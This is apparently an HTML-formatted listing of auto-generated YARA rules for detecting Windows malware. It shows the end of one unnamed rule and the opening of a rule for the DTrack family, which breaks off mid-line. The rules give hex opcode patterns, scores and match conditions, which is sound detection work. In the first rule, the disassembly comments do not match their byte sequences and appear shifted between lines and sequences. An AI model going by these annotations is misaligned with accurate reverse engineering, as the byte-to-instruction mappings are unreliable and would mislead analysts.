&nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41b901000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd6&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bcb&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_2 = { 4881ec90050000 8b01 8985c8040000 8b4104 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4881ec90050000&nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jns&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x16<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8985c8040000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4104&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_3 = { 488b01 ff10 488b4f08 4c8d4c2430 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, esi<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4f08&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, ebx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4c8d4c2430&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_4 = { 488b01 ff10 488b4e18 488b01 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ecx + 0x18], 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4e18&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| sub&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x590<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_5 = { 4881eca0000000 33c0 488bd9 488d4c2432 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4881eca0000000&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dword ptr [ebp + 0x4c8], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx + 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d4c2432&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x4d0], eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_6 = { 488b01 eb03 488bc1 0fb600 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;eb03&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, dword ptr [ebp + ebp]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb600&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movups&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xmmword ptr [edi], xmm0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_7 = { 488b01 8b10 895124 448b4124 4585c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| sub&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x30<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;895124&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;448b4124&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4585c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; ecx, eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_8 = { 4c8d0d31eb0000 c1e918 c1e808 41bf00000080 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4c8d0d31eb0000&nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x1e6<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e918&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e808&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [0xbda0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41bf00000080&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_9 = { 488bd8 4885c0 752d ff15???????? 83f857 0f85e0010000 488d0da0bd0000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;752d&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83f857&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f85e0010000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x2f<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d0da0bd0000&nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, 0x57<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_10 = { 75d4 488d1d7f6c0100 488b4bf8 4885c9 740b }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;75d4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [0xeb31]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d1d7f6c0100&nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 0x18<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4bf8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;740b&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edi, 0x80000000<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_11 = { 0f85d9000000 488d15d0c90000 41b810200100 488bcd e8???????? eb6b b9f4ffffff }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f85d9000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xffffffd6<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d15d0c90000&nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41b810200100&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, [0x16c7f]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bcd&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;eb6b&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; ecx, dword ptr [ebx - 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;b9f4ffffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_12 = { 48890d???????? 488905???????? 488d05ae610000 488905???????? 488d05a0550000 488905???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;//&nbsp; &nbsp; 48890d????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d05ae610000&nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; 488d05a0550000&nbsp; &nbsp; &nbsp; &nbsp;| je&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488905????????&nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_13 = { 8bcf e8???????? 488b7c2448 85c0 0f8440030000 488d0560250100 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8bcf&nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 0x12010<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b7c2448&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;85c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, ebp<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f8440030000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x83<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d0560250100&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 0xfffffff4<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_14 = { ff15???????? 8b05???????? 2305???????? ba02000000 33c9 8905???????? 8b05???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b05????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;2305????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ba02000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, [0x61ae]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8905????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b05????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_15 = { 4883ec30 498bd8 e8???????? 488bc8 4885c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 100<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4883ec30&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xdf<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;498bd8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bc8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, [0xc9d0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4885c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 7 of them and filesize &lt; 557056<br>}</td>
</tr>
<tr>
<td>rule win_dtrack_auto {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_0 = { 52 8b4508 50 e8???????? 83c414 8b4d10 51 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 400<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4508&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c414&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x14<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4d10&nbsp; &nbsp; &nbsp; 